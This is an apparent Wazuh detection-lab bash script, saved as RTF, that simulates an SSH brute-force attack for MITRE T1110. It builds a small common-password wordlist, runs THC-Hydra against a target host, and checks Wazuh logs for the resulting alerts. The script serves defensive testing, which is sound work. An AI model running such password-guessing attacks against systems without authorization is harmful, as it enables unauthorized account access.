{\rtf1\ansi\ansicpg1252\cocoartf2868
\cocoatextscaling0\cocoaplatform0{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
{\colortbl;\red255\green255\blue255;}
{\*\expandedcolortbl;;}
\margl1440\margr1440\vieww11520\viewh8400\viewkind0
\pard\tx720\tx1440\tx2160\tx2880\tx3600\tx4320\tx5040\tx5760\tx6480\tx7200\tx7920\tx8640\pardirnatural\partightenfactor0

\f0\fs24 \cf0 #!/usr/bin/env bash\
#\
# 01_brute_force.sh\
# Simulates: SSH Brute Force Attack\
# MITRE ATT&CK: T1110 (Brute Force) - Credential Access\
# Detection layer: Wazuh SSH authentication-failure rules (via /var/log/auth.log)\
# Tool: THC-Hydra\
#\
# Usage: ./01_brute_force.sh [target_host] [username]\
# Example: ./01_brute_force.sh 10.0.1.209 baduser\
#\
# NOTE: Run this only against hosts you own or are explicitly authorized to test.\
\
set -euo pipefail\
\
TARGET="$\{1:-localhost\}"\
FAKE_USER="$\{2:-baduser\}"\
MANAGER_CONTAINER="single-node-wazuh.manager-1"\
WORDLIST="/tmp/brute_force_wordlist.txt"\
\
echo "=== SSH Brute Force Simulation (Hydra) ==="\
echo "Target: $\{TARGET\}"\
echo "Username: $\{FAKE_USER\}"\
echo ""\
\
# Install hydra if not already present\
if ! command -v hydra &> /dev/null; then\
  echo "Hydra not found, installing..."\
  sudo apt update && sudo apt install -y hydra\
fi\
\
# Generate a small throwaway wordlist of bad passwords for the run\
cat > "$\{WORDLIST\}" << 'EOF'\
password\
123456\
admin123\
letmein\
qwerty123\
football\
password1\
welcome1\
changeme\
iloveyou\
EOF\
\
echo "Wordlist created at $\{WORDLIST\} ($(wc -l < "$\{WORDLIST\}") passwords)"\
echo ""\
echo "Launching Hydra against $\{TARGET\}:22 ..."\
echo ""\
\
# -l single username, -P password list, -t 4 parallel threads, -V verbose per-attempt output\
hydra -l "$\{FAKE_USER\}" -P "$\{WORDLIST\}" -t 4 -V "ssh://$\{TARGET\}" || true\
\
echo ""\
echo "=== Simulation complete. Waiting for log propagation... ==="\
sleep 3\
\
echo ""\
echo "=== Verifying alert in Wazuh ==="\
docker exec -it "$\{MANAGER_CONTAINER\}" grep -i "sshd\\|authentication failure\\|Failed password" \\\
  /var/ossec/logs/alerts/alerts.json | tail -10\
\
echo ""\
echo "Done. Check the Wazuh dashboard for rule group 'authentication_failures' / T1110 alerts."\
echo "Cleanup: rm $\{WORDLIST\}"}